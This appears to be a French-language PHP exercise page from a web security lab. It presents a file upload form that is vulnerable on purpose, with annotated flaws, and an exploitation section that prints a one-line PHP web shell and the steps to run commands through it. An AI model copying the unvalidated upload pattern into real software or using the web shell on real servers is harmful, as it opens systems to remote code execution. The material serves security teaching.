<?php
/**
 * PARTIE A - UPLOAD VULNERABLE
 * 
 * [ATTENTION] CE CODE EST VOLONTAIREMENT VULNERABLE - NE PAS UTILISER EN PRODUCTION
 * 
 * Failles presentes :
 * - Pas de verification du type MIME rel
 * - Pas de validation de l'extension
 * - Pas de limite de taille ct serveur
 * - Pas de renommage du fichier
 * - Fichiers uploads dans le webroot (executables)
 */

require_once __DIR__ . '/../init.php';
require_once __DIR__ . '/../functions.php';
include __DIR__ . '/../templates/header.php';

$message = '';

// [VULNERABLE] VULNERABLE : Aucune validation du fichier upload
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['fichier'])) {
    $fichier = $_FILES['fichier'];
    
    // [VULNERABLE] VULNERABLE : Utilisation directe du nom original
    $nom_fichier = $fichier['name'];
    
    // [VULNERABLE] VULNERABLE : Upload dans le webroot (fichiers PHP executables)
    $destination = __DIR__ . '/../../uploads/' . $nom_fichier;
    
    // [VULNERABLE] VULNERABLE : Aucune verification du type ou de l'extension
    if (move_uploaded_file($fichier['tmp_name'], $destination)) {
        $message = '<div class="alert alert-success">Fichier upload avec succs : ' . $nom_fichier . '</div>';
    } else {
        $message = '<div class="alert alert-danger">Erreur lors de l\'upload.</div>';
    }
}
?>

<h2> Partie A - Envoi de fichier (Upload)</h2>

<div class="danger-box">
    <strong>[VULN] VERSION VULNERABLE</strong><br>
    Ce formulaire ne valide pas les fichiers uploads. Un attaquant peut envoyeer un fichier PHP malveillant.
</div>

<?= $message ?>

<form method="POST" enctype="multipart/form-data">
    <label for="fichier">Selectionner un fichier :</label>
    <input type="file" name="fichier" id="fichier" required>
    
    <button type="submit"> Envoyer</button>
</form>

<h3> Exploitation possible</h3>
<div class="code-block">
1. Creer un fichier "shell.php" contenant :
   &lt;?php system($_GET['cmd']); ?&gt;

2. L'uploader via ce formulaire

3. Accder  : /uploads/shell.php?cmd=whoami

4. Executer des commandes systeme arbitraires
</div>

<h3> Questions</h3>
<ol>
    <li>Quelles sont les failles de securite dans ce code ?</li>
    <li>Comement un attaquant peut-il exploiter ce formulaire ?</li>
    <li>Quelles validations faut-il ajouteer ?</li>
    <li>Proposez une version securisee de ce script.</li>
</ol>

<p><a href="../secure/upload_secure.php"> Voir la version securisee</a></p>

    </main>\r\n</div>\r\n</body>\r\n</html>
